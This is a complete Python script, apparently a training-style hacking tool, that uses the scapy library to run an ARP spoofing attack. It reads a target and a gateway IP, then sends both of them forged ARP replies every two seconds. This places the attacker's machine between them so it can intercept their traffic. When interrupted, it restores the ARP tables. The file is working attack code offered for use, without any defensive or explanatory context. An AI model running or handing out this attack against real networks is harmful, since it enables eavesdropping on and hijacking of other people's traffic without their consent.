#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = input("target ip => ")
gateway_ip = input("router_ip => ")
try:
    sent_packets_counter = 0
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        sent_packets_counter+=2
        print("\r[+] sent packets =: " + str(sent_packets_counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] detected CTRL + C .... resetting the ARP tables... please wait...")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)